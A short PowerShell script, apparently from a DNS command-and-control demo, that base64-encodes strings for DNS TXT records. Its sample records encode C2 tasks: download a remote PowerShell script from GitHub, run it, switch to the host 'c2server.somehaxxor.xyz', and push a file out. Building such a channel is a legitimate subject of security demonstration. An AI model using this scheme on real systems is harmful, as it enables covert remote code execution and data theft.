Function Write-TXTEncodedRecord {
    PARAM (
        $str,
        $maxLength = 255
    )

    [string]$encodedStr = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($str))
    
    If ($encodedStr.Length -gt $maxLength) {
        Write-Host $encodedStr -ForegroundColor Yellow -NoNewline
        Write-Host " (Max length of $($maxLength) reached with $($encodedStr.Length) chars)"
    } else {
        Write-Host $encodedStr
    }

}

Write-TXTEncodedRecord 'riro;0;Write;Time to do some C2-stuff ;)'
Write-TXTEncodedRecord 'riro;1;Get;https://raw.githubusercontent.com/rirofal/DNS-C2-Demo/main/demo-remote-script.ps1'
Write-TXTEncodedRecord 'riro;2;PS;demo-remote-script.ps1'
Write-TXTEncodedRecord 'riro;3;Set;c2server.somehaxxor.xyz'
Write-TXTEncodedRecord 'riro;4;Push;demo-push-out.txt'
